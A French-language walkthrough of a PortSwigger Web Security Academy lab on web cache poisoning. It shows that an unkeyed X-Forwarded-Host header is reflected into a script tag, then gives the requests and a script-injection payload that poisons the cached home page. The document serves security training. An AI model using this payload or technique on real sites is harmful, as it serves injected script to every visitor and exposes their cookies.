# Lab

https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-with-an-unkeyed-header

## Payload

Quand on envoie une requete vers la home page, on voit dans les headers de la réponse :

```
Cache-Control: max-age=30
Age: 0
X-Cache: miss
```

Ce qui nous indique que la home page peut être cachée pendant 30 secondes et que la page n'est pas en cache.

Si on renvoie la même requete, on voit que la page est en cache :

```
Cache-Control: max-age=30
Age: 1
X-Cache: hit
```

Avec `Param Miner`, on va essayer de trouver des paramètres qui ne sont pas utilisés dans la requete.

On trouve que si on envoie le header `X-Forwarded-Host` dans la requête, il est utilisé pour générer dynamiquement une balise `script` dans la page.

```
GET / HTTP/2
Host: 0a45002204eb92208085c608008f00e6.web-security-academy.net
X-Forwarded-Host: test
```

```html	
Cache-Control: max-age=30
Age: 6
X-Cache: hit

...
<script type="text/javascript" src="//test/resources/js/tracking.js"></script>
...
```

Si on poison le cache avec le header `X-Forwarded-Host` avec la valeur `"></script><script>alert(document.cookie)</script>` et qu'on envoie la requête, on obtient :

```html
Cache-Control: max-age=30
Age: 0
X-Cache: miss

...
<script type="text/javascript" src="//"></script><script>alert(document.cookie)</script>/resources/js/tracking.js"></script>
...
```

Et on valide le lab.